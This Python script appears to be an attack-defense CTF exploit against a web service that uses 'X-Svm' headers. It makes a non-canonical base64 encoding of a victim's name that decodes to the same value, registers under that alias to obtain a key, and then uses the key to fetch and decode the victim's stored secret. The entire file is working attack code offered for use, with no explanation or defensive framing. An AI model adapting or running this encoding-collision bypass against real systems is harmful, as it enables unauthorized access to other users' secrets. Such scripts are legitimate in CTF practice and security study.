import requests
import base64
import string
import sys

NAME_HEADER = 'X-Svm-Name'
SECRET_HEADER = 'X-Svm-Secret'
AUTHOR_HEADER = 'X-Svm-Author'
KEY_HEADER = 'X-Svm-Key'

base64_alpha = string.ascii_letters + string.digits
ip = sys.argv[1]
port = int(sys.argv[2])

victim_name_decoded = sys.argv[3]
victim_name = base64.b64encode(victim_name_decoded.encode()).decode()

some_content = b'hello-there'

same_base64 = []

for a in base64_alpha:
    p = victim_name[:-2] + a + victim_name[-1]
    if p == victim_name:
        continue
    try:
        if base64.b64decode(p).decode() == victim_name_decoded:
            same_base64.append(p)
            print(p)
    except Exception as e:
        print(e)
        print(p)
if len(same_base64) == 0:
    print('no collision')
    exit()

p = same_base64[0]

print(f'will use {p}')


with requests.post(f'http://{ip}:{port}/api/demo', 
                   headers={NAME_HEADER: p, SECRET_HEADER: 'TWu=', AUTHOR_HEADER: 'TWu='},
                   files={p: some_content}) as r:
    if r.status_code != 200: raise ValueError(f'{r.status_code} on post')

    key = r.headers.get(KEY_HEADER)

    print(f'The key for {victim_name} is {key}')

with requests.get(f'http://{ip}:{port}/api/demo',
                  headers={NAME_HEADER: victim_name, KEY_HEADER: key}) as r:
    if r.status_code != 200: raise ValueError(f'{r.status_code} on get')

    print(base64.b64decode(r.json()['secret']).decode())
